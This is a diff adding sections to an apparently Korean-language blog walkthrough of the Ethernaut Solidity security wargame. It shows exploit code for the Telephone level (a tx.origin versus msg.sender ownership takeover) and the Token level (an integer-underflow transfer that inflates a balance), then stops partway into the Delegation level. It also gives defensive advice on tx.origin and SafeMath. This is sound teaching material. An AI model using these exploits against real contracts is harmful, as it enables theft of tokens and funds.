@@ -325,10 +325,110 @@ hackCoinFlip의 guess 메소드를 10번 실행하면 되겠습니다(Remix에�
 이번 단계는 전화 교환원이 힌트입니다. 전화를 거는 사람과 중간에서 그 전화를 받아서 다른 사람에게 연결해 주는 교환원이 있는 상황과 유사하다고 할 수 있겠습니다.
 이 문제를 통해 `tx.origin` 과 `msg.sender`의 차이점을 이해할 수 있어야 합니다.
 
+역시 주어진 컨트랙트의 소유권을 가져오는 것이 목표입니다. 다음과 같은 메소드가 있습니다. 일반적으로 트랜잭션을 전송하는
+계정은 msg.sender가 되므로 tx.origin과 항상 일치할 것으로 생각합니다.
 
+{% highlight javascript %}
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+        owner = _owner;
+    }
+}
+{% endhighlight %}
+
+그런데 만약 다른 컨트랙트를 통해 이 메소드를 호출할 경우에도 msg.sender와 tx.origin이 일치할까요? 그렇지 않습니다!
+
+{% highlight javascript %}
+pragma solidity ^0.4.25;
+
+contract hackTelephone {
+
+    address public owner;
+    Telephone public telephone;
+
+    constructor(address _addr) public {
+        owner = msg.sender;
+        telephone = Telephone(_addr);
+    }
+
+    function pickUpThePhone() public {
+        telephone.changeOwner(owner);
+    }
+}
+
+contract Telephone {
+    function changeOwner(address _owner) public;
+}
+{% endhighlight %}
+
+일반적으로 tx.origin을 어떤 조건으로 사용하는 것은, 특히 토큰 소유 계정으로 사용하는 것은 바람직하지 않습니다.
+다음과 같이 사용하는 것은 주의해야 합니다.
+<font color="red">
+{% highlight html %}
+function transfer(address _to, uint _value) {
+    tokens[tx.origin] -= _value;
+    tokens[_to] += _value;
+}
+{% endhighlight %}
+</font>
+
+### 5. Token (difficulty 3/10)
+
+이번 레벨은 다음과 같은 목표를 달성하면 됩니다.
+
+> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
+
+이미 지급된 20개의 토큰보다 더 많은 토큰을 가지도록 하면 통과입니다. 힌트를 읽어보겠습니다.
+
+> What is an odometer?
+
+오도미터는 가스 계량기처럼 자리수가 차면 바로 위 높은 자리수가 하나씩 올라가는, 여기서는 기계식 계기판을 떠올리면 될 것 같습니다.
+이것은 솔리디티의 산술계산의 문제로 많이 알려진 "오버/언더플로우"와 관련이 있는데요, 예를 들어 4비트 부호 없는 정수의 경우는 나타낼 수 있는
+범위의 수는 0000 ~ 1111인데, 1111 + 0001은 <b>1</b>0000이 되지만 오버플로우로 인해 0000이 되는 셈입니다(15+1=16인데 0이라니?).
+반대로 0000 - 0001은 1111이 되어(1의 보수 또는 2의 보수 뺄셈 연산에 의해) 15가 되겠지요(0-1=-1인데 15라니?).
+
+솔리디티의 uint는 256비트 길이의 부호 없는 정수형으로 마찬가지 현상이 발생합니다. 다시 말해서 가지고 있는 토큰 수량보다 더 많은 토큰을
+다른 주소로 보내면 원래 수량보다 큰 수를 마이너스하게 되어 잔액 토큰의 수량은 엉뚱한 값으로 바뀌게 될 것입니다. 이러한 연산 오류를 방지하기
+위해 보통 OpenZeppelin의 [SafeMath][safemath]와 같은 라이브러리를 사용합니다.
+
+다음과 같이 임의의 주소로 보유한 수량보다 더 많은 토큰을 전송해보겠습니다.
+
+{% highlight html %}
+await contract.transfer("0x3f228fe2aadd49f9343b9a8a339cdd99b2b1b6c6", 500000)
+{% endhighlight %}
+
+그리고 남은 토큰을 조회하면
+
+{% highlight html %}
+a = await contract.balanceOf(player)
+t {s: 1, e: 77, c: Array(6)}
+a.toNumber()
+1.157920892373162e+77
+
+{% endhighlight %}
+
+언제 이렇게 많은 토큰을 가지고 있었나요?! 👀
+
+
+### 6. Delegation (difficulty 4/10)
+
+다른 문제처럼 컨트랙트의 소유권을 가져오는 문제입니다만 약간 생각할 것들이 있습니다.
+
+> * Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
+* Fallback methods
+* Method ids
+
+우선 `delegatecall`이라는 함수를 알아야 하고 Fallback, 메소드 ID(메소드 셀렉터, 메소드 시그너처와 유사)를 이용해야 합니다.
+<b>delegatecall</b>은 실행되는 코드가 자신이 속한 컨트랙트의 저장영역(상태변수)을 바꾸는 것이 아니라 해당 메소드를 호출하는
+컨트랙트의 저장영역을 바꿀 수 있도록 하는 호출 방식입니다.
+
+메소드를 실행하면 그 메소드는 자신의 컨트랙트의 상태변수 값을 읽거나 쓰는 것이 일반적이겠지만
+delegatecall은 다른 컨트랙트의 코드를 실행시켜 현재 컨트랙트의 storage에 접근하는 것을 허용합니다(라이브러리 컨트랙트가 그런 일을 합니다).
+
+문제에 주어진 두 개의 컨트랙트가 있습니다.
 
 [ethernaut]: https://ethernaut.zeppelin.solutions/
 [ethernaut-gh]: https://github.com/OpenZeppelin/ethernaut
 [faucet]: https://faucet.metamask.io/
 [remix]: http://remix.ethereum.org/
-
+[safemath]: https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
